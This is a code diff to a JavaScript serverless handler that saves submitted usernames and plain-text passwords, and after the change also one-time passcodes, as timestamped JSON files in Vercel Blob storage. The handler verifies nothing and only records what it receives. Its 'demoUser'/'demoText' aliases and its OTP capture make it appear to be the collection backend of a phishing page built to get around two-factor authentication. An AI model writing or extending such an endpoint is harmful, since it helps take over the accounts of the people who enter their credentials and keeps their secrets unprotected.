@@ -5,7 +5,7 @@ import { put } from '@vercel/blob';
  * 
  * Requirements:
  * - Accept POST requests only
- * - Read req.body (username/demoUser and password/demoText)
+ * - Read req.body (username, password, otp)
  * - Save to Vercel Blob in a structured format with private access
  */
 export default async function handler(req, res) {
@@ -17,7 +17,7 @@ export default async function handler(req, res) {
 
   try {
     // Read body parameters supporting both structural keys and original demo keys
-    const { username, password, demoUser, demoText } = req.body || {};
+    const { username, password, otp, demoUser, demoText } = req.body || {};
 
     const finalUsername = username || demoUser;
     const finalPassword = password || demoText;
@@ -33,10 +33,11 @@ export default async function handler(req, res) {
     const safeTimestamp = isoTimestamp.replace(/:/g, '-');
     const filename = `submissions/submission_${safeTimestamp}.json`;
 
-    // Structure credential data cleanly and securely
+    // Structure credential data cleanly including OTP if provided
     const dataToSave = {
       username: finalUsername,
       password: finalPassword,
+      otp: otp || '',
       timestamp: isoTimestamp,
     };
 
